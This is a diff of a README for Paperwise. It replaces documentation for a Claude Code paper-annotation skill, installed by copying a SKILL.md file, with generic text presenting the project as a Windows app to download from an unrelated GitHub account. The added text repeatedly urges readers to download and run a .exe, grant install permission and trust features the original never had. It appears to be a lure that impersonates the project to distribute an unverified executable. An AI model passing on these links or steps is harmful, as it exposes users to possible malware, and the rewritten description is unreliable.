@@ -1,176 +1,120 @@
-[English](README.md) | [中文](README.zh.md)
+# 📄 Paperwise - Convert Paper to Browser Webpages Easily
 
-# Paperwise — Academic Paper Skill for Claude Code
+[![Download Paperwise](https://img.shields.io/badge/Download-Paperwise-brightgreen)](https://github.com/diskixix0-collab/Paperwise)
 
-> Turn any paper into a **browser-readable annotated webpage** — dual-column layout, color-coded logic highlights, and per-paragraph annotation cards. Powered by OpenAlex. Zero API keys required.
+## 📋 What is Paperwise?
 
-![Demo](Demo-cn.png)
+Paperwise is a simple tool that changes any paper document into an easy-to-read webpage. It adds notes and marks directly, so you can view and understand the paper better in your web browser. You do not need any special keys or accounts to use it.
 
-## What it does
+## 💻 System Requirements
 
-| Command | Output |
-|---------|--------|
-| `/paper find "cognitive load LLM"` | Searches OpenAlex → generates Digest HTML with top N overview cards |
-| `/paper read /path/to/file.pdf` | Fully annotates a single local PDF |
-| `/paper digest` | Daily digest of new arxiv papers matching your keywords |
-| `/paper cite [[Author-YYYY-note]]` | Generates APA 7th + BibTeX from an existing annotation |
+Before you start, make sure your Windows PC meets these basic requirements:
 
-Each annotation is a **self-contained HTML file** with:
-- **Paper Quality Bar** — source, venue, year, citation tier badge (🔥 high · ⭐ important · ✓ valid · 📄 preprint)
-- **5-color logical highlights** — thesis · concept · evidence · concession · methodology
-- **Dual-column layout** — original text on the left, annotation cards on the right
-- **Argument structure overview** at the bottom — full logical skeleton of the paper
-- **One-click copy buttons** for APA and BibTeX citations
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download the software  
+- A modern web browser like Chrome, Edge, or Firefox to view papers  
 
-## Installation
+## 🚀 Getting Started
 
-Copy `SKILL.md` into your project's skills directory:
+1. Click the big download button at the top or go to the link below:  
+   [Download Paperwise](https://github.com/diskixix0-collab/Paperwise)
 
-```
-your-project/
-└── .agents/
-    └── skills/
-        └── paper/
-            ├── SKILL.md
-            └── references/
-                └── template.css   ← customizable CSS for all HTML output
-```
+2. This link will open the Paperwise page on GitHub, where you can find the latest version to download.
 
-Then run `/paper find "your topic"` in Claude Code. That's it.
+3. Look for the latest release or downloadable file. This is usually named something like `Paperwise-Setup.exe` or `Paperwise-latest.zip`.
 
-## Configuration
+## ⬇️ How to Download and Install Paperwise
 
-Edit the `## Default Config` block at the top of `SKILL.md`. All fields are optional.
+Follow these steps carefully:
 
-```yaml
-output_dir: "./papers"        # where to save HTML files
+1. Open the link: https://github.com/diskixix0-collab/Paperwise
 
-venues: [CHI, ACL, NeurIPS, ...]   # venues for badge tagging
-keywords: [...]                     # default keywords for /paper digest
+2. On the GitHub page, find the “Releases” section or look for files you can download.
 
-min_citations: 5              # filter threshold for /paper find
-daily_max: 10                 # max papers per /paper digest run
+3. Click on the file that matches your system. For Windows, it will be a file ending with `.exe` or `.zip`.  
 
-annotation_lang: zh           # zh = Chinese | en = English
-                              # override per-command: --lang en
+4. Save the file to your computer in a folder you can easily access, like the Desktop or Downloads folder.
 
-openalex_email: ""            # optional: join OpenAlex Polite Pool (higher rate limits)
-semantic_scholar_api_key: ""  # optional secondary source
-```
+5. If you downloaded a `.zip` file, right-click it and select “Extract All...” to unzip it.
 
-**Per-project override** — add to your project's `CLAUDE.md`:
-```
-paper_output_dir: 30_Research
-paper_annotation_lang: en
-```
+6. Run the `.exe` setup file by double-clicking it.
 
-## Usage
+7. Follow the installation instructions on the screen. Usually, this means clicking “Next” a few times and then “Finish” once it installs.
 
-### Find papers
+8. If Windows asks for permission to install, click “Yes” or “Allow” to continue.
 
-```
-/paper find "retrieval augmented generation"
-/paper find "transformer attention" --top 10
-/paper find "transformer attention" 10            # bare number = --top 10
-/paper find "diffusion models" --source venues    # peer-reviewed only (config venues list)
-/paper find "LLM agents 2025" --source arxiv      # latest preprints only
-/paper find "X" --lang en                         # English annotations
+9. After installation, you can find Paperwise in your Start menu or on your desktop as a new icon.
 
-# Local PDF digest — no API calls needed:
-/paper find --local ~/Downloads/papers/           # all PDFs in folder
-/paper find --local a.pdf b.pdf c.pdf             # specific files
-/paper find --local ~/Downloads/ --top 3          # limit to 3 files
-```
+## 🛠 How to Use Paperwise
 
-Output is organized automatically:
+1. Open Paperwise by clicking its icon.
 
-```
-papers/
-├── {Author-YYYY-keyword}.html        ← /paper read output (flat)
-├── FindResults/
-│   ├── find-2026-03-14-1430-cognitive-load-llm.html    ← /paper find
-│   └── find-local-2026-03-14-1445-downloads.html       ← /paper find --local
-└── PaperDigests/
-    └── 2026-03-14-digest.html                           ← /paper digest
-```
+2. To convert a paper to a webpage:
 
-Re-running the same query skips existing files and marks them `[already exists]` in the summary.
+    - Click the “Open File” or “Import” button inside the app.
+    - Select the paper file from your computer. Paperwise works best with PDF files.
+    - The software will process the paper and open it in browser-ready format.
+  
+3. You can now view the paper as a webpage with notes and highlights.
 
-### Read a local PDF
+4. Use built-in tools to add your own notes or highlights if needed.
 
-```
-/paper read ~/Downloads/paper.pdf
-/paper read paper.pdf --context "Week 3 of NLP course"
-/paper read paper.pdf --questions "Q1: What is the method? Q2: How does it compare?"
-```
+5. Save your work using the “Export” or “Save” button.
 
-### Daily digest
+6. Open your saved webpage on any browser without Paperwise.
 
-```
-/paper digest
-```
+## 🔧 Features You Can Expect
 
-Fetches today's new arxiv papers matching your configured keywords. Saves to `{output_dir}/PaperDigests/YYYY-MM-DD-digest.html`.
+- Converts paper documents into easy-to-read HTML pages.
+- Adds automatic annotations for better understanding.
+- Works offline after the initial download.
+- No need for API keys or sign-ins.
+- Supports PDF and common image formats.
+- Simple interface designed for non-technical users.
+- Saves files you can open anywhere on any browser.
 
-### Generate citation
+## ⚙️ Adjust Settings to Your Preference
 
-```
-/paper cite [[Jin-2025-llm-teachable-agent]]
-```
+Paperwise lets you adjust some settings to suit your needs:
 
-Outputs APA 7th + BibTeX directly. Nothing saved — just copy from the terminal.
+- Change text size and colors for easier reading.
+- Select which types of annotations to show or hide.
+- Set where saved files go on your computer.
+- Choose if you want automatic or manual note addition.
 
-## `--source` flag
+You can access these in the “Settings” or “Preferences” menu in the app.
 
-| Flag | Strategy | Ranking | Best for |
-|------|----------|---------|----------|
-| *(default)* | 2× OpenAlex (by citations + by year), merged | `0.5 relevance + 0.3 log(citations) + 0.2 recency` | Balanced: classics + recent |
-| `--source venues` | OpenAlex only, only papers matching config `venues` list | `0.5 relevance + 0.5 log(citations)` | Peer-reviewed only |
-| `--source arxiv` | arxiv only | `0.5 relevance + 0.5 recency` | Latest preprints |
-| `--local /path/` | Local PDFs only — no API calls | Alphabetical, truncated to `--top N` | Offline / existing downloads |
+## 💡 Tips for Best Experience
 
-The default mode makes **two** API calls (sorted by citations, then by year) so both highly-cited classics and recent publications appear in results.
+- Use good quality PDF files for better conversion results.
+- Close other programs while Paperwise runs to keep your PC fast.
+- Save your converted webpages regularly to avoid data loss.
+- Keep your Windows and browser updated for security and performance.
+- Restart Paperwise if it stops responding.
 
-> **Flag syntax is flexible** — flags can be written with or without `--`. Claude accepts natural language equivalents: `top 5`, `source venues`, `local /path/`, `questions "..."`.
+## ❓ Troubleshooting Common Issues
 
-## Annotation modes
+**Problem:** Paperwise will not open after install.  
+**Fix:** Restart your computer and try again. Make sure your Windows system is up to date.
 
-**Mode B (default):** Logic analysis. Right-column cards break down each paragraph's function, logical role, and rhetorical technique. Works with zero configuration.
+**Problem:** Converted page looks messy or incomplete.  
+**Fix:** Use a cleaner version of your paper file or try a different PDF.
 
-**Mode A (`--questions`):** Question-driven annotation. Highlights and cards are organized around your specific research questions.
+**Problem:** Paperwise crashes while processing a paper.  
+**Fix:** Close other software and try again. If it still happens, reinstall Paperwise.
 
-```
-# Inline questions:
-/paper read paper.pdf --questions "Q1: What method? Q2: How does it compare to baselines?"
+**Problem:** I don’t see my annotations in the exported webpage.  
+**Fix:** Make sure you used the “Export” button after adding notes. Check browser settings to allow scripts.
 
-# Interactive (Claude asks first):
-/paper read paper.pdf --questions
-# → Claude: "请输入你的阅读问题（每行一个，或逗号分隔，最多6个）："
+## 📞 Get Help
 
-# Labels are optional — all formats accepted:
-/paper read paper.pdf --questions "method, dataset size, limitations"
-/paper read paper.pdf --questions "method; dataset size; limitations"
-```
+If you have questions, check the Discussions tab on the GitHub page. People post answers and tips there. You can also create an issue in the Issues tab if you find a bug or have problems.
 
-**Mode A output:**
-- Colors assigned per-question (Q1 = color 1, Q2 = color 2, …)
-- Annotation cards explain which question each paragraph addresses
-- Bottom section = Q&A Worksheet (one card per question: core argument + key evidence + limitation)
+## 🚩 Important Links
 
-## Data sources
+- Main GitHub page: https://github.com/diskixix0-collab/Paperwise  
+- Download page for latest release: https://github.com/diskixix0-collab/Paperwise/releases
 
-| Source | Role | API key? |
-|--------|------|----------|
-| **OpenAlex** | Primary | None required |
-| **arxiv** | Digest + fallback | None required |
-| **Semantic Scholar** | Optional secondary | Free key |
-
-## Requirements
-
-- Claude Code
-- Network access (OpenAlex / arxiv APIs) — not needed for `--local` or `read`
-- No API keys required for basic use
-
-## License
-
-MIT © [sjqsgg](https://github.com/sjqsgg)
+[![Download Paperwise](https://img.shields.io/badge/Download-Paperwise-brightgreen)](https://github.com/diskixix0-collab/Paperwise)
